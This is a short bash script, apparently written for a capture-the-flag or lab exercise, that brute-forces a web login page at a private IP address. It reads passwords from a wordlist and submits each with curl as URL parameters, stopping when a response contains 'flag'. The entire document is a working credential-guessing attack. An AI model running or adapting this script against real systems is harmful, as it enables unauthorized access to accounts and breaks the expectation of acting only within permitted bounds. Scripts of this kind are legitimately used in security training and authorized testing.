!/bin/bash

username="admin" # The username we
host="192.168.1.17" # The ip address of the machine
dictionary="passwords.txt" # Path to the dictionary (password list)
i=1 # A simple iterator to know howmany password have we tried

while IFS= read -r password;
do
	echo -n "trying [$i]: $password"
	curl -s "http://$host/?page=signin&username=$username&password=$password&Login=Login#" | grep flag > /dev/null
	if [ $? -eq 0 ]
	then
		printf "\n\n"
		echo "Found the password : $password"
		exit
	fi
	((i=i+1))
	printf "\33[2K\r"
done < $dictionary